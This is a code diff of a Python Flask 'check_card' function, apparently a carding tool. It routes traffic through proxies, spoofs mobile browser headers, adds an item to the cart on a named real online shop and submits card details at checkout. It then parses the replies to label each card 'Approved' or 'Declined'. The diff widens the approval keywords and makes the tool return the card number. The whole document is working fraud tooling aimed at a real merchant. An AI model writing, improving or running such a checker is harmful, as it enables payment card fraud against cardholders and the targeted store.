@@ -101,34 +101,30 @@ def check_card():
         r.proxies.update(proxy_dict)
     
     url = "https://silvercellwireless.com"
-
     params = {
-  'wc-ajax': "add_to_cart"
+        'wc-ajax': "add_to_cart"
     }
-
     payload = {
-  'success_message': "“Travel+Wall+Charger+Type+C”+has+been+added+to+your+cart",
-  'product_sku': "travel_wall_charger_typec",
-  'product_id': "1232",
-  'quantity': "1"
+        'success_message': "Travel+Wall+Charger+Type+C+has+been+added+to+your+cart",
+        'product_sku': "travel_wall_charger_typec",
+        'product_id': "1232",
+        'quantity': "1"
     }
-
     headers = {
-  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
-  'Accept': "application/json, text/javascript, */*; q=0.01",
-  'sec-ch-ua-platform': "\"Android\"",
-  'x-requested-with': "XMLHttpRequest",
-  'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
-  'sec-ch-ua-mobile': "?1",
-  'origin': "https://silvercellwireless.com",
-  'sec-fetch-site': "same-origin",
-  'sec-fetch-mode': "cors",
-  'sec-fetch-dest': "empty",
-  'referer': "https://silvercellwireless.com/shop/page/2/",
-  'accept-language': "en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5",
-  'priority': "u=1, i",
+        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
+        'Accept': "application/json, text/javascript, */*; q=0.01",
+        'sec-ch-ua-platform': "\"Android\"",
+        'x-requested-with': "XMLHttpRequest",
+        'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
+        'sec-ch-ua-mobile': "?1",
+        'origin': "https://silvercellwireless.com",
+        'sec-fetch-site': "same-origin",
+        'sec-fetch-mode': "cors",
+        'sec-fetch-dest': "empty",
+        'referer': "https://silvercellwireless.com/shop/page/2/",
+        'accept-language': "en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5",
+        'priority': "u=1, i",
     }
-
     response = r.post(url, params=params, data=payload, headers=headers)
     
     url = "https://silvercellwireless.com/checkout/"
@@ -431,36 +427,46 @@ def check_card():
     }
     response = r.post(url, data=payload, headers=headers)
     
-    soup = BeautifulSoup(response.text, 'html.parser')
-    error_element = soup.find('ul', class_='woocommerce-error')
-    error_message = None
-    if error_element:
-        li_items = error_element.find_all('li')
-        for li in li_items:
-            text = li.text.strip()
-            if 'Status code' in text or 'error' in text.lower():
-                error_message = text
-                break
-        if not error_message and li_items:
-            error_message = li_items[0].text.strip()
+    response_text_lower = response.text.lower()
     
-    if re.search(r'Avs', response.text) or re.search(r'avs', response.text):
-        result = "Approved-1000 ✅"
-    elif re.search(r'Nice', response.text):
-        result = "Approved-1000 ✅"
-    elif re.search(r'Added', response.text):
-        result = "Approved-1000 ✅"
-    elif re.search(r'Successfully', response.text):
-        result = "Approved-1000 ✅"
-    elif error_message and 'Status code' in error_message:
-        result = f"Declined: {error_message}"
-    elif error_message:
-        result = f"Declined: {error_message}"
+    if re.search(r'nice', response_text_lower):
+        result = "Approved ✅"
+    elif re.search(r'avs', response_text_lower):
+        result = "Approved ✅"
+    elif re.search(r'added', response_text_lower):
+        result = "Approved ✅"
+    elif re.search(r'successfully', response_text_lower):
+        result = "Approved ✅"
+    elif re.search(r'thank you', response_text_lower):
+        result = "Approved ✅"
+    elif re.search(r'order received', response_text_lower):
+        result = "Approved ✅"
+    elif re.search(r'payment method added', response_text_lower):
+        result = "Approved ✅"
+    elif re.search(r'your order is complete', response_text_lower):
+        result = "Approved ✅"
     else:
-        result = "Unknown error"
+        soup = BeautifulSoup(response.text, 'html.parser')
+        error_element = soup.find('ul', class_='woocommerce-error')
+        error_message = None
+        if error_element:
+            li_items = error_element.find_all('li')
+            for li in li_items:
+                text = li.text.strip()
+                if 'Status code' in text or 'error' in text.lower():
+                    error_message = text
+                    break
+            if not error_message and li_items:
+                error_message = li_items[0].text.strip()
+        
+        if error_message:
+            result = f"Declined ❌: {error_message}"
+        else:
+            result = "Unknown error ❌"
     
     return jsonify({
         'result': result,
+        'card': cc,
         'email': email,
         'first_name': first_name,
         'last_name': last_name,
